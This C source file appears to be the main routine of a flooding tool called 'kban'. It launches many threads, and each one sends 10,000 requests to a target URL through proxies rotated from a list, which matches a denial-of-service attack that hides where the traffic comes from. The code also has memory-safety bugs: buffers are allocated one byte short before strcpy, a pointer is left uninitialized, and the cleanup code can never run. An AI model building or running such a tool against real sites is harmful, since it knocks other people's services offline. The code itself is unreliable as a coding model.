#include "kban.h"
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CURL_COUNT 10000

int main(int argc, char** argv) {
  if(argc < 3) {
    printf("Too few arguments.\n");
    return -1;
  }
  if(argc > 4) {
    printf("Too many arguments.\n");
    return -1;
  }

  int threadCount = atoi(argv[1]);
  pthread_t* threads = malloc(sizeof(pthread_t) * threadCount);
  if(threads == NULL) {
    return -1;
  }

  ProxyList* plist;
  char* targetURL = argv[2];
  if(argc == 4) {
    char* proxyFile = argv[3];
    plist = readProxies(proxyFile);
    if(plist == NULL) {
      return -1;
    }
  }

  int i;
  for(i = 0; i < threadCount; i++) {
    ThreadArgs* raw_args = malloc(sizeof(ThreadArgs));
    if(raw_args == NULL) {
      return -1;
    }

    raw_args->id = i + 1;
    raw_args->count = CURL_COUNT;

    raw_args->url = malloc(strlen(targetURL));
    if(raw_args->url == NULL) {
      free(raw_args);
      return -1;
    }
    strcpy(raw_args->url, targetURL);

    if(plist != NULL) {
      char* proxy = plist->proxies[i % plist->len];
      raw_args->proxy = malloc(strlen(proxy));
      if(raw_args->proxy == NULL) {
        free(raw_args->url);
        free(raw_args);
        return -1;
      }
      strcpy(raw_args->proxy, proxy);
    }

    void* args = (void*)raw_args;
    pthread_create(&threads[i], NULL, runThread, args);
  }
  pthread_exit(NULL);
  free(threads);
  if(plist != NULL) {
    for(i = 0; i < plist->len; i++) {
      free(plist->proxies[i]);
    }
    free(plist);
  }
}
